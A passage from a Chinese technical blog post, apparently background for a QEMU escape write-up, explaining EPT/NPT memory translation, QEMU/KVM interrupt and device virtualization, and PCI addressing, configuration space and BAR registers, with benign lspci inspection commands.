Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>来宾页表：GVA → GPA</strong></p>
<ul>
<li>由来宾 OS 自己维护（gCR3 指向的页表），机制与真机一致（4K&#x2F;2M&#x2F;1G 页、LA57、SMEP&#x2F;SMAP 等）。</li>
</ul>
</li>
<li><p><strong>二级页表（硬件&#x2F;KVM）：GPA → HPA</strong></p>
<ul>
<li>Intel：<strong>EPT</strong>，AMD：<strong>NPT</strong>。支持 4K&#x2F;2M&#x2F;1G 二级页，通常选 <strong>Write-Back</strong> 内存类型。</li>
<li>当 GPA 首次触达或权限不满足时会发生 <strong>EPT&#x2F;NPT violation</strong>（或缺页），触发 <strong>VM-Exit</strong>，KVM&#x2F;内核再建立&#x2F;修正映射后重新进入来宾。</li>
</ul>
</li>
</ul>
<p>当<strong>来宾系统</strong>执行一条<strong>内存访问指令</strong>时，通常会有如下过程：</p>
<ol>
<li><p><strong>快路径：TLB 命中（硬件一步到位）</strong></p>
<p>当同一地址最近访问过、TLB 里已经有“合成后的”条目时，CPU 在来宾里执行：<code>GVA ──TLB命中──► HPA   → 直接读/写 DRAM</code></p>
<ul>
<li>这条 TLB 记录其实是“<strong>GVA→HPA</strong> 的组合结果”（包含了两段翻译的缓存），所以<strong>不需要再查页表，也不会 VM-Exit</strong>。</li>
<li><strong>HVA 完全没出现</strong>；硬件不认识它。</li>
</ul>
</li>
<li><p><strong>慢路径（第一次访问 &#x2F; TLB 未命中）</strong></p>
<p>TLB miss 时，硬件要做“两段式翻译”。注意：<strong>连“读来宾页表本身”的每一步，也要经过 EPT&#x2F;NPT</strong>。</p>
<ol>
<li><p>来宾页表把 <strong>GVA → GPA</strong>（仍在 VMX non-root，硬件完成）</p>
<p>以 x86-64 四级页表为例（PML4→PDPT→PD→PT），硬件做：</p>
<ol>
<li>读 <strong>gCR3</strong> 得到来宾页表根（一个 <strong>GPA</strong>）；</li>
<li>依次读 PML4E、PDPTE、PDE、PTE——<strong>这些表项都存放在“来宾物理内存”里</strong>，所以每次读表项（用到 GPA）又会<strong>通过下一步 EPT</strong>去取对应的 <strong>HPA</strong>；</li>
<li>得到最终 <strong>GPA</strong>（或大页的 GPA）。</li>
</ol>
<blockquote>
<p>如果某一级表项 <strong>不存在&#x2F;权限不符</strong>，CPU在<strong>来宾内部</strong>触发 <strong>#PF（页错误）</strong>，交给来宾内核处理（仍在 non-root，不会到 KVM，除非你特意设置拦截）。</p>
</blockquote>
</li>
<li><p>二级页表把 <strong>GPA → HPA</strong>（需要则 VM-Exit）</p>
<p>硬件用 VMCS&#x2F;VMCB 里的 <strong>EPTP&#x2F;NPT</strong> 做二级翻译：</p>
<ul>
<li><p>若 EPT 有可用映射（权限&#x2F;类型允许），得到 <strong>HPA</strong> → <strong>直接访问内存</strong>，然后把“GVA→HPA”的结果写回 TLB，后续就走快路径。</p>
</li>
<li><p>若 EPT <strong>没映射&#x2F;权限不符&#x2F;写保护</strong>（比如做<strong>脏页跟踪</strong>，或这块 GPA 其实是 MMIO），会触发 <strong>EPT&#x2F;NPT violation</strong>：<br>→ <strong>VM-Exit 到 KVM</strong>，KVM 查看这个 GPA 属于哪一类区域：</p>
<ul>
<li><strong>RAM memslot</strong>：KVM 会<strong>用 HVA 定位到底层页</strong>（<code>get_user_pages()</code> pin 出 PFN），<strong>建立&#x2F;修正 EPT</strong>，然后 VM-Entry 继续执行；</li>
<li><strong>MMIO&#x2F;设备区域</strong>：KVM 不去建 EPT 映射，而是把这次访问包装成 <code>KVM_EXIT_MMIO</code> 交给 QEMU 的设备回调去处理（你题里的 <code>qwb_mmio_*</code> 就是这样被调用的）。</li>
</ul>
</li>
</ul>
<blockquote>
<p>至此你能看到：<strong>硬件真正访存只到 HPA</strong>。<strong>HVA 只在 KVM 建&#x2F;改 EPT 的那一刻被用作“找到那个物理页”的线索</strong>，和 QEMU 用户态做 <code>memcpy()</code> 时当作普通指针使用。</p>
</blockquote>
</li>
</ol>
</li>
</ol>
<h3 id="外设虚拟化"><a href="#外设虚拟化" class="headerlink" title="外设虚拟化"></a>外设虚拟化</h3><p>QEMU 里外设虚拟化的目标是：让 Guest 看到“像真的”设备，并在<strong>功能、性能、可迁移性</strong>之间取舍。控制面靠 <strong>PIO&#x2F;MMIO</strong>，数据面靠 <strong>DMA</strong>；运行时遇到设备访问会 <strong>VM-Exit→QEMU（或快路径）</strong> 处理。</p>
<p>QEMU 外设虚拟化的实现方式主要有三种：</p>
<ul>
<li><strong>纯模拟（QEMU device model）</strong>：设备寄存器以 PIO&#x2F;MMIO 暴露；每次访问 VM-exit → QEMU 回调处理。</li>
<li><strong>准虚拟（virtio 家族）</strong>：以 <strong>virtqueue</strong> 共享环传数据，显著减少陷入；数据面可下沉到 <strong>vhost（内核）</strong> 或 <strong>vhost-user（外部进程，如 DPDK&#x2F;SPDK&#x2F;virtiofsd）</strong>，或用 <strong>vDPA</strong> 由硬件&#x2F;内核直接跑。</li>
<li><strong>直通（VFIO，含 SR-IOV&#x2F;VF）</strong>：设备直接给 VM，用 IOMMU 做 DMA 隔离，性能接近裸机；</li>
</ul>
<h3 id="中断虚拟化"><a href="#中断虚拟化" class="headerlink" title="中断虚拟化"></a>中断虚拟化</h3><h4 id="中断控制器"><a href="#中断控制器" class="headerlink" title="中断控制器"></a>中断控制器</h4><p>中断控制器主要有两种：</p>
<ul>
<li><strong>Intel 8259（PIC）</strong>：传统单处理器时代的可编程中断控制器（通过 IRQ0–IRQ15）。</li>
<li><strong>I&#x2F;O APIC + LAPIC</strong>：SMP 时代的主流组合：<ul>
<li><strong>IOAPIC</strong>：芯片组侧把外设中断路由到 CPU 逻辑中断向量。</li>
<li><strong>LAPIC</strong>：每个 vCPU 上的本地 APIC，负责接收&#x2F;投递中断；<strong>x2APIC</strong> 模式用 MSR 代替 MMIO，访问更快、向量空间更大。</li>
</ul>
</li>
</ul>
<p>QEMU 支持既能用户态模拟 8259&#x2F;IOAPIC&#x2F;LAPIC，也能调用 <strong>KVM 的 in-kernel irqchip</strong> 在内核中模拟，以减少 VM-Exit。对应的命令行（x86）：<code>-machine kernel-irqchip=on|off|split</code></p>
<ul>
<li><code>on</code>：8259&#x2F;IOAPIC&#x2F;LAPIC 全部在内核模拟（<strong>性能最佳，推荐</strong>）。</li>
<li><code>off</code>：全部由 QEMU 用户态模拟（易调试，<strong>性能最低</strong>）。</li>
<li><code>split</code>：通常是 <strong>LAPIC 在内核、IOAPIC&#x2F;PIC 在用户态</strong>，用于兼容&#x2F;迁移场景（行为依平台&#x2F;版本）。</li>
</ul>
<h4 id="中断类型"><a href="#中断类型" class="headerlink" title="中断类型"></a>中断类型</h4><p>中断有三种类型的虚拟化：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>触发方式</th>
<th>经手的控制器</th>
<th>特性</th>
<th>适用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>INTx</strong></td>
<td>电平触发线（INTA~D），共享</td>
<td><strong>IOAPIC → LAPIC</strong>（可能先过 PIC）</td>
<td>可能“黏线”，<strong>必须 EOI</strong> 撤线；易抖动</td>
<td>兼容保底</td>
</tr>
<tr>
<td><strong>MSI</strong></td>
<td>设备<strong>写一条内存消息</strong>（MSI addr&#x2F;data）</td>
<td><strong>直达 LAPIC</strong></td>
<td>向量少，已优于 INTx</td>
<td>老驱动&#x2F;设备</td>
</tr>
<tr>
<td><strong>MSI‑X</strong></td>
<td>同 MSI，但每队列独立条目</td>
<td><strong>直达 LAPIC</strong></td>
<td><strong>多向量</strong>（队列一对一），最稳最快</td>
<td><strong>强烈推荐</strong>（网&#x2F;块多队列）</td>
</tr>
</tbody></table>
<ul>
<li>INTx，且 <code>kernel-irqchip=off</code>（全在 QEMU，最慢）<ol>
<li><strong>Raise</strong>：QEMU 仿真设备调用 <code>pci_set_irq(dev, level=1)</code> 提出中断。</li>
<li><strong>Route</strong>：QEMU 修改虚拟 <strong>IOAPIC</strong> 的重定向表（目标 vCPU、触发方式、向量）。</li>
<li><strong>Deliver</strong>：QEMU 通过 KVM 的 ioctl 把中断注入到 vCPU（用户态切内核，再切到 vCPU）</li>
<li><strong>EOI</strong>：来宾在 LAPIC 写 EOI → <strong>VM‑Exit 到 QEMU</strong> → QEMU 更新 LAPIC&#x2F;IOAPIC 状态 → 再回到 vCPU。<br>⇒ 每步都可能 VM‑Exit&#x2F;用户态往返 → <strong>性能最差</strong>。</li>
</ol>
</li>
<li>INTx，且 <code>kernel-irqchip=on</code>（全在内核，快很多）<ol>
<li><strong>Raise</strong>：<ul>
<li>QEMU 仿真设备可以直接通过 <strong>irqfd</strong> 把一个 <code>eventfd</code> 绑到 GSI；设备一触发就把 eventfd 写 1。</li>
<li>KVM 内核 irqchip 收到 eventfd → <strong>内核里</strong>更新 IOAPIC&#x2F;PIC 状态。</li>
</ul>
</li>
<li><strong>Route&#x2F;Deliver</strong>：<strong>内核</strong>查 IOAPIC 表，直接送到目标 vCPU&#x2F;LAPIC。</li>
<li><strong>EOI</strong>：来宾写 LAPIC EOI → <strong>内核里</strong>处理，不再退出到 QEMU。<br>⇒ <strong>无需 QEMU 参与</strong>注入&#x2F;EOI，<strong>延迟大幅降低</strong>。<br>（没有 irqfd 时，QEMU 也可以用 <code>KVM_IRQ_LINE</code> 注入，但仍比全用户态快）</li>
</ol>
</li>
<li>MSI‑X + irqfd（virtio&#x2F;vhost&#x2F;VFIO 常用，最快）<ol>
<li><p><strong>Raise</strong>：设备要发 MSI‑X，本质是一次<strong>写内存</strong>到“APIC 目标地址 + 数据”。</p>
<ul>
<li>仿真设备：QEMU可直接 <code>kvm_irqchip_send_msi()</code>（<code>KVM_SIGNAL_MSI</code>）。</li>
<li><strong>vhost&#x2F;VFIO</strong>：把每个中断向量绑定一个 <strong>irqfd</strong>（eventfd）。后端或硬件触发这个 eventfd。</li>
</ul>
</li>
<li><p><strong>Route&#x2F;Deliver</strong>：KVM 内核根据 <strong>MSI 路由表</strong>（GSI routing）直接把中断送达目标 vCPU 的 LAPIC，<strong>不退出</strong>到 QEMU。</p>
</li>
<li><p><strong>EOI</strong>：来宾 LAPIC EOI 在内核处理（若硬件有 APICv&#x2F;PI，还能进一步减少退出）。<br>⇒ <strong>消息信号 + in‑kernel + irqfd</strong>：<strong>常见最优路径</strong>。</p>
</li>
</ol>
</li>
</ul>
<h2 id="PCI-设备"><a href="#PCI-设备" class="headerlink" title="PCI 设备"></a>PCI 设备</h2><p><strong>PCI（Peripheral Component Interconnect）</strong>是一套“主机 ↔ 外设”的标准总线与软件模型。它经历了演进：</p>
<ul>
<li><strong>PCI（并行）</strong> → <strong>PCI-X</strong>（并行&#x2F;服务器） → <strong>PCIe（PCI Express，串行点到点）</strong>。</li>
<li>软件模型延续：都有<strong>配置空间（Configuration Space）</strong>、<strong>BAR（Base Address Register）</strong>、<strong>中断</strong>、<strong>DMA</strong>等概念；PCIe 只是<strong>物理与链路层</strong>变了，并新增了很多能力（MSI-X、热插拔、错误报告、节能等）。</li>
</ul>
<blockquote>
<p>把主板想成一座城市：</p>
<ul>
<li><strong>CPU&#x2F;Root Complex</strong> &#x3D; 市政府</li>
<li><strong>PCIe Root Port &#x2F; 交换机（Switch）</strong> &#x3D; 城市立交</li>
<li><strong>各类设备（网卡、显卡、NVMe、FPGA…）</strong> &#x3D; 公司大楼（Endpoint）</li>
</ul>
<p>开机后，政府（Root Complex）把所有大楼“接上光纤”（<strong>链路训练</strong>：速率&#x2F;宽度握手），然后一栋栋<strong>盘点信息</strong>（<strong>配置空间</strong>），分配<strong>门牌号</strong>（<strong>BDF：Bus:Device.Function</strong>）和<strong>地盘</strong>（<strong>BAR：一段可映射的地址</strong>），最后发工作许可（<strong>Bus Master</strong>）和电话分机（<strong>中断：MSI&#x2F;MSI-X</strong>）。<br>之后：</p>
<ul>
<li>设备要读写内存，就自己“<strong>DMA</strong>去搬货”；</li>
<li>干完活，它打分机（<strong>MSI-X</strong>）通知 CPU；</li>
<li>CPU 的驱动接电话，继续分派任务。</li>
</ul>
<p>这就是“PCI 设备”在机器里的日常。</p>
</blockquote>
<p>典型的 <strong>PCIe 拓扑</strong>：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CPU / Root Complex</span><br><span class="line">   ├─ Root Port 0 ──[Switch]── NVMe(0000:65:00.0)</span><br><span class="line">   └─ Root Port 1 ── GPU(0000:03:00.0)</span><br></pre></td></tr></table></figure></div>

<p>每个功能都有个 <strong>BDF</strong>（域:总线:设备.功能），如 <code>0000:65:00.0</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/339ae9e895d76bfb2dd2ec366ed7b147.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="BDF-DBDF-编址"><a href="#BDF-DBDF-编址" class="headerlink" title="BDF&#x2F;DBDF 编址"></a>BDF&#x2F;DBDF 编址</h3><h4 id="BDF-DBDF-编址格式"><a href="#BDF-DBDF-编址格式" class="headerlink" title="BDF&#x2F;DBDF 编址格式"></a>BDF&#x2F;DBDF 编址格式</h4><p>每个 PCI 设备通过一段 <code>BB:DD.F</code> 格式的数据编址来表示。BDF 是“枚举顺序 + 桥的划分”决定的，加&#x2F;拔设备、换插槽、BIOS 升级、桥&#x2F;Root Port 重新枚举，都可能改变 <strong>Bus</strong> 号甚至设备号。但同一机器同一拓扑下，BDF 通常稳定。</p>
<ul>
<li><p><strong>BDF</strong>：<code>BB:DD.F</code></p>
<ul>
<li><p>**Bus (BB，总线号)**：8 位 → 0..255（显示为 00..ff）</p>
</li>
<li><p>**Device (DD，设备号&#x2F;插槽号)**：5 位 → 0..31（一个总线最多 32 个“设备号”）</p>
</li>
<li><p>**Function (F，功能号)**：3 位 → 0..7（同一设备号最多 8 个“功能”）</p>
<blockquote>
<p>一个 PCI 设备（同一个 <code>DD</code>）<strong>最多有 8 个函数</strong>（<code>F=0..7</code>），叫“<strong>多功能设备</strong>”：</p>
<ul>
<li>典型例子：PCH（南桥）下面的 <strong>00:1f.0 LPC</strong>、<strong>00:1f.2 SATA</strong>、<strong>00:1f.3 SMBus</strong> … 它们共享同一个设备号 <code>1f</code>，功能号不同。</li>
<li>是否多功能由 <strong>Function 0 的 Header Type bit7</strong> 决定（1&#x3D;多功能）。</li>
<li>驱动加载时按 <strong>Function 维度</strong>匹配：每个 Function 都有独立的配置空间（Vendor&#x2F;Device ID 也可能不同）。</li>
</ul>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>DBDF</strong>：<code>DDDD:BB:DD.F</code></p>
<ul>
<li>**Domain&#x2F;Segment (DDDD，域)**：16 位 → 0..FFFF（通常为 <code>0000</code>；多根 PCIe Root Complex、复杂 NUMA&#x2F;加速卡&#x2F;直通场景时可能 &gt;0）</li>
</ul>
</li>
</ul>
<p>例如：</p>
<ul>
<li><code>00:1f.2</code> &#x3D; 总线 0、设备 31、功能 2；</li>
<li><code>0000:65:00.0</code> &#x3D; 域 0 的 65:00.0。</li>
</ul>
<p><code>lspci</code> 默认可能省略 <code>0000:</code>，用 <code>-D</code> 可强制显示域：<code>lspci -D -s 65:00.0</code>。其它常用命令如下：</p>
<ul>
<li><p>总是显示域号（Domain）：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci -D -s 65:00.0</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>看树：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci -tv</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>看驱动&#x2F;模块：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci -k -s 65:00.0     <span class="comment"># &quot;Kernel driver in use&quot; / &quot;Kernel modules&quot;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="BDF-与机器拓扑"><a href="#BDF-与机器拓扑" class="headerlink" title="BDF 与机器拓扑"></a>BDF 与机器拓扑</h4><p>PCIe 是“<strong>树形</strong>”拓扑：Root Complex → Root Port →（可选）Switch → Endpoint。用 <code>lspci -t</code>（或 <code>-tv</code>）可以看到设备树，比如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-+-[0000:65]-+-00.0  (Root Port)</span><br><span class="line"> |           \-00.1  (Root Port)</span><br><span class="line"> \-[0000:66]-+-00.0  (Switch Upstream)</span><br><span class="line">             \-[0000:67]-00.0  (你的网卡 67:00.0)</span><br></pre></td></tr></table></figure></div>

<p>这里 <strong><code>67:00.0</code></strong> 的 <strong>67</strong> 就是被上面的桥划给它的<strong>子总线号</strong>。</p>
<p><strong>每一级“桥”</strong>（PCI-to-PCIe Bridge&#x2F;Switch Port）在枚举时会配置三组“总线号寄存器”：</p>
<ul>
<li><strong>Primary Bus</strong>（桥自己所在的上游总线）</li>
<li><strong>Secondary Bus</strong>（桥下游<strong>第一个</strong>子总线号）</li>
<li><strong>Subordinate Bus</strong>（桥下游<strong>最大</strong>子总线号）</li>
</ul>
<p>枚举时，固件&#x2F;OS 会：</p>
<ol>
<li>给桥分配 Secondary&#x2F;Subordinate 的<strong>总线号区间</strong>；</li>
<li>在该区间内为下挂的设备分配 **Device(0..31)**，并探测其 <strong>Function</strong>；</li>
</ol>
<p>因此 <strong>Bus 号取决于桥的划分</strong>，<strong>Device&#x2F;Function</strong> 再在该 Bus 内唯一。</p>
<h4 id="DBDF-到文件系统的对应"><a href="#DBDF-到文件系统的对应" class="headerlink" title="DBDF 到文件系统的对应"></a>DBDF 到文件系统的对应</h4><p>在 <strong>sysfs</strong> 和 <strong>procfs</strong> 各有一套接口来映射 PCI 设备，<strong>它们不是同一个目录</strong>。</p>
<ul>
<li><p><strong>sysfs（现代、推荐）</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/sys/bus/pci/devices/0000:65:00.0/</span><br><span class="line">  ├── vendor / device / class         # 身份字段</span><br><span class="line">  ├── config                          # 配置空间（root可读写）</span><br><span class="line">  ├── resource, resource0, resource1  # BAR 范围与映射</span><br><span class="line">  ├── numa_node                       # NUMA 归属</span><br><span class="line">  ├── driver -&gt; ...                   # 当前绑定的内核驱动</span><br><span class="line">  ├── msi_irqs/                       # MSI/MSI-X 中断向量（如有）</span><br><span class="line">  ├── iommu_group/                    # IOMMU 组（直通/VFIO 关键）</span><br><span class="line">  ├── physfn / virtfn*/               # SR-IOV PF/VF 关系（如有）</span><br><span class="line">  └── remove / rescan / enable        # 动态管理接口</span><br></pre></td></tr></table></figure></div>

<p>从下面三者任一入口访问，<strong>作用于同一个设备对象</strong>（因为就是同一个目录的不同“索引”）。</p>
<ul>
<li><strong>物理&#x2F;层次视图</strong>：<code>/sys/devices/pci0000:00/.../0000:BB:DD.F/</code> ← <strong>真实设备节点</strong></li>
<li><strong>总线视图</strong>：<code>/sys/bus/pci/devices/0000:BB:DD.F</code> ← <strong>指向上面实体的符号链接</strong></li>
<li><strong>类视图</strong>：<code>/sys/class/net/eth0/device</code>、<code>/sys/class/drm/card0/device</code> ← <strong>也指回实体</strong></li>
</ul>
</li>
<li><p><strong>procfs（旧接口，可能不存在）</strong></p>
<p>这套接口<strong>不是</strong> <code>/sys/devices/...</code> 的链接，导出的文件也<strong>不包含</strong> sysfs 中的丰富属性（如 <code>resource/driver/iommu_group/sriov_*</code> 等）。</p>
<ul>
<li><strong><code>/proc/bus/pci/BB/DD.F</code><strong>：映出</strong>配置空间</strong>（许多系统只保证前 256B；部分内核导出到 4KiB）。</li>
<li><strong><code>/proc/bus/pci/devices</code><strong>：所有设备的</strong>文本汇总</strong>（非结构化）。</li>
<li>多域系统上可能出现额外的域层级（路径因内核不同而异）。</li>
</ul>
</li>
</ul>
<h4 id="BDF-与配置空间访问"><a href="#BDF-与配置空间访问" class="headerlink" title="BDF 与配置空间访问"></a>BDF 与配置空间访问</h4><p>访问配置空间时，必须用 <strong>Bus&#x2F;Device&#x2F;Function&#x2F;Offset</strong> 这四元组索引到目标 Function：</p>
<ul>
<li><p><strong>PCI 机制 #1（x86 经典 0xCF8&#x2F;0xCFC）</strong></p>
<ul>
<li>写 <code>0xCF8</code>：<code>0x80000000 | (Bus&lt;&lt;16) | (Device&lt;&lt;11) | (Function&lt;&lt;8) | (Offset &amp; ~3)</code></li>
<li>在 <code>0xCFC</code> 读&#x2F;写 32 位数据（或对 <code>0xCFC+1/2/3</code> 做 8&#x2F;16 位）</li>
</ul>
</li>
<li><p><strong>PCIe ECAM（MMCONFIG）</strong></p>
<ul>
<li>物理地址 &#x3D; <code>ECAM_BASE + (Bus&lt;&lt;20) + (Device&lt;&lt;15) + (Function&lt;&lt;12) + Offset</code></li>
<li>每个 Function 对应 <strong>4KiB</strong> 的映射窗口（0x000..0xFFF）</li>
</ul>
</li>
</ul>
<blockquote>
<p>也就是说，<strong>BDF 既是“名字”，也是访问坐标</strong>。Domain&#x2F;Segment 由 ACPI MCFG 指定不同段的 ECAM 基址，<strong>不参与</strong>单个 PCIe 事务的 Requester ID（后者只有 Bus&#x2F;Device&#x2F;Function）。</p>
</blockquote>
<h3 id="配置空间"><a href="#配置空间" class="headerlink" title="配置空间"></a>配置空间</h3><p><strong>配置空间”（Configuration Space）</strong>本质上就是<strong>“设备芯片内部的一堆寄存器”</strong>，用于<strong>枚举&#x2F;识别&#x2F;配置</strong>设备。操作系统通过“配置访问通道”把<strong>读&#x2F;写请求</strong>送到设备，设备把这些寄存器的内容返回。</p>
<h4 id="配置空间结构"><a href="#配置空间结构" class="headerlink" title="配置空间结构"></a>配置空间结构</h4><p>传统 PCI 的配置空间大小为 <strong>256 B</strong>；而 PCIe 在次基础上有额外的 <strong>4 KiB 扩展配置空间</strong>，配置空间结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/571df8d0cacf54ec05ab2d59a0ed3396.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><strong>标准头（前 64B）</strong>常见字段：<ul>
<li><code>Vendor ID</code> &#x2F; <code>Device ID</code>：识别厂商与设备；</li>
<li><code>Command</code>（控制位）：<code>bit0 I/O Space</code>、<code>bit1 Memory Space</code>、<code>bit2 Bus Master</code>（DMA 必须开）…</li>
<li><code>Status</code>：错误&#x2F;能力支持等状态位；</li>
<li><code>Class Code/Subclass/ProgIF</code>：设备类别（网卡&#x2F;存储&#x2F;桥…）；</li>
<li><code>Header Type</code>：0&#x3D;端点，1&#x3D;桥，2&#x3D;CardBus；</li>
<li><strong>BAR0..BAR5</strong>：最多 6 个基址寄存器（Endpoint 类型）；</li>
<li><code>Capabilities Pointer</code>：指向“<strong>能力链表</strong>”（PM、MSI、MSI-X、PCIe Cap…）。</li>
</ul>
</li>
<li><strong>PCIe 扩展能力</strong>在 4 KiB 的<strong>扩展能力空间</strong>链表里（例如 AER、ACS、ARI、SR-IOV、ATS&#x2F;PRI&#x2F;PASID、L1 Substates…）。</li>
</ul>
<h4 id="配置空间查看"><a href="#配置空间查看" class="headerlink" title="配置空间查看"></a>配置空间查看</h4><p>通过 <code>lspci</code> 命令 <code>-s</code> 参数指定 BDF 地址就可以查看对应设备的配置空间信息：</p>
<ul>
<li><p>只看某个设备（总线 65 的 00.0）：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci -s 65:00.0 -vv</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>看配置空间十六进制（前 256B 或 4KiB）：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci -xxxx -s 65:00.0</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>上述信息本质上是通过 <code>sysfs</code> 文件系统的 PCI 设备接口下的 <code>config</code> 文件查看的：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /sys/bus/pci/devices/0000:65:00.0/config | xxd</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>procfs</code> 文件系统的 PCI 设备接口也可以查看 配置空间：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /proc/bus/pci/65/00.0 | xxd</span><br></pre></td></tr></table></figure></div>

<h3 id="BAR-寄存器"><a href="#BAR-寄存器" class="headerlink" title="BAR 寄存器"></a>BAR 寄存器</h3><p><strong>BAR（Base Address Register）&#x3D; 基址寄存器</strong>。</p>
<p>设备用它来声明“<strong>我需要一扇对外的地址窗口</strong>”（可以是 I&#x2F;O 空间或内存空间），操作系统据此在系统的地址空间中为它<strong>划一块不冲突的地址段</strong>，再把基址写回 BAR。之后：</p>
<ul>
<li>CPU 访问“<strong>基址 + 偏移</strong>”就能访问到设备寄存器&#x2F;缓冲区（<strong>MMIO 或 PIO</strong>）；</li>
<li>设备内部的地址译码（decoder）看到这段地址，会把事务路由到对应的寄存器&#x2F;存储阵列。</li>
</ul>
<p>不同类型的 PCI 设备的 BAR 寄存器数量是不同的：</p>
<ul>
<li><p><strong>端点（Header Type&#x3D;0）</strong>最多有 <strong>BAR0..BAR5</strong> 共 6 个 BAR。</p>
<ul>
<li><code>0x10..0x24</code>：BAR0..BAR5（每个占 4 字节）；</li>
<li><code>0x30</code>：Expansion ROM Base Address（单独的“ROM BAR”，带 Enable 位）。</li>
</ul>
</li>
<li><p><strong>桥设备（Header Type&#x3D;1）</strong>只有 <strong>BAR0..BAR1</strong> 两个；其余空间用于桥窗口寄存器。</p>
<ul>
<li><p>桥自身只有 <strong>BAR0..BAR1</strong> 两个（常很小或未实现）；</p>
</li>
<li><p>重要的是<strong>桥窗口寄存器</strong>（不在 BAR，而在配置空间其他字段）：</p>
<ul>
<li><strong>I&#x2F;O Base&#x2F;Limit</strong>：下游 I&#x2F;O 端口范围；</li>
<li><strong>Memory Base&#x2F;Limit</strong>：下游非预取 MMIO 范围；</li>
<li><strong>Prefetchable Memory Base&#x2F;Limit</strong>（含 64 位上半）：下游预取 MMIO 范围。</li>
</ul>
<p>这三组窗口让“上游地址”能<strong>透传</strong>到子总线的设备 BAR。OS&#x2F;固件在枚举时会先分配 BAR，再设置桥窗口覆盖到它们。</p>
</li>
</ul>
</li>
</ul>
<h4 id="BAR-寄存器结构"><a href="#BAR-寄存器结构" class="headerlink" title="BAR 寄存器结构"></a>BAR 寄存器结构</h4><ul>
<li><strong>I&#x2F;O BAR（端口 I&#x2F;O，主要在 x86）</strong><ul>
<li><strong>bit0&#x3D;1</strong> 表示这是 <strong>I&#x2F;O 空间</strong>（PIO）BAR；</li>
<li><strong>bits[31:2]</strong> 保存 <strong>端口基址</strong>（低 2 位必须为 0，表示对齐）；</li>
</ul>
</li>
<li><strong>Memory BAR（内存映射 I&#x2F;O，MMIO）</strong><ul>
<li><p><strong>bit0&#x3D;0</strong> 表示 <strong>内存空间</strong>（MMIO）BAR；</p>
</li>
<li><p><strong>bit2:1（Memory Type）</strong>：</p>
<ul>
<li><code>00</code> &#x3D; 32 位地址</li>
<li><code>01</code> &#x3D; 20 位地址（1MB 以下，极少见的历史遗留）</li>
<li><code>10</code> &#x3D; <strong>64 位地址</strong>（占用<strong>两个</strong>连续 BAR 槽，低位在前，高位在后）</li>
<li><code>11</code> &#x3D; 保留</li>
</ul>
</li>
